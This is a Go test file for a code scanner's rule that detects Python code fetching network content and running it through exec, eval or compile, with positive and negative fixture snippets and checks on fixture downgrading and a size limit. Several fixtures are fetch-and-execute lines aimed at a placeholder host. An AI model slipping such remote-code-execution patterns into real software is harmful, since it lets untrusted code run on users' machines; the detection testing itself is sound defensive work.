package scan

import (
	"context"
	"strings"
	"testing"

	"github.com/Kevin-Umali/repyy/internal/model"
)

func TestPythonRemoteFlow(t *testing.T) {
	cases := []struct {
		name, code string
		want       bool
		sameLine   int
	}{
		{"inline requests", "exec(requests.get('https://example.invalid/code').text)\n", true, 1},
		{"inline urllib", "exec(urlopen('https://example.invalid/code').read())\n", true, 1},
		{"requests aliases", "import requests\ndef run():\n    response = requests.get('https://example.invalid/data')\n    text = response.text\n    payload = text\n    exec(payload)\n", true, 0},
		{"httpx bytes", "response = httpx.get('https://example.invalid')\npayload = response.content\neval(payload)\n", true, 0},
		{"response metadata", "status = requests.get('https://example.invalid').status_code\nexec(status)\n", false, 0},
		{"regex compilation", "response = requests.get('https://example.invalid').text\nre.compile(response)\n", false, 0},
		{"urllib read", "from urllib.request import urlopen\nresponse = urlopen('https://example.invalid')\nbody = response.read().decode('utf-8')\nexec(body)\n", true, 0},
		{"urllib dotted and compile", "response = urllib.request.urlopen('https://example.invalid')\nsource = response.read()\ncompiled = compile(source, '<input>', 'exec')\n", true, 0},
		{"functions separated", "def fetch():\n    body = requests.get('https://example.invalid').text\ndef other():\n    exec(body)\n", false, 0},
		{"overwritten", "body = requests.get('https://example.invalid').text\nbody = 'ordinary'\nexec(body)\n", false, 0},
		{"equality preserves response", "body = requests.get('https://example.invalid').text\nbody == 'ordinary'\nexec(body)\n", true, 0},
		{"typed overwrite", "body = requests.get('https://example.invalid').text\nbody: str = 'ordinary'\nexec(body)\n", false, 0},
		{"deleted", "body = requests.get('https://example.invalid').text\ndel body\nexec(body)\n", false, 0},
		{"augmented overwrite", "body = requests.get('https://example.invalid').text\nbody += suffix\nexec(body)\n", false, 0},
		{"comments and strings", "# body = requests.get('https://example.invalid').text\nmessage = 'exec(body)'\nexec('body')\n", false, 0},
		{"branch exit", "if condition:\n    body = requests.get('https://example.invalid').text\nexec(body)\n", false, 0},
		{"branch arms", "if condition:\n    body = requests.get('https://example.invalid').text\nelse:\n    exec(body)\n", false, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			writeFixture(t, root, "sample.py", tc.code)
			coverage, findings := New(Options{}).Scan(context.Background(), root)
			finding, ok := ruleFinding(findings, "FLOW-002")
			if !coverage.Complete || ok != tc.want {
				t.Fatalf("unexpected flow: coverage=%+v finding=%+v", coverage, finding)
			}
			if ok && (finding.Context != "executable" || finding.Severity != model.SeverityHigh || finding.Confidence != model.ConfidenceMedium || finding.Disposition != model.DispositionReview || len(finding.Locations) != 2 || finding.Locations[0].StartLine > finding.Locations[1].StartLine || tc.sameLine != 0 && (finding.Locations[0].StartLine != tc.sameLine || finding.Locations[1].StartLine != tc.sameLine)) {
				t.Fatalf("incorrect evidence: %+v", finding)
			}
		})
	}
}

func TestPythonRemoteFlowFixtureContext(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "fixtures/sample.py", "body = requests.get('https://example.invalid').text\nexec(body)\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "FLOW-002")
	if !ok || finding.Context != "test-fixture" || finding.Confidence != model.ConfidenceLow || finding.Disposition != model.DispositionInformational {
		t.Fatalf("fixture was not downgraded: %+v", finding)
	}
}

func TestPythonRemoteFlowBound(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "sample.py", "# requests\n"+strings.Repeat("#", pythonFlowMaxSource))
	rule := Rule{ID: "CUSTOM-001", Category: "dynamic-execution", Severity: model.SeverityHigh, Confidence: model.ConfidenceMedium, Description: "Dynamic evaluation", Pattern: `\beval\(`}
	if err := rule.Compile(); err != nil {
		t.Fatal(err)
	}
	coverage, _ := New(Options{Rules: []Rule{rule}}).Scan(context.Background(), root)
	if coverage.Complete || !strings.Contains(strings.Join(coverage.Skipped, " "), "Python flow source-byte limit") {
		t.Fatalf("expected incomplete flow coverage: %+v", coverage)
	}
}
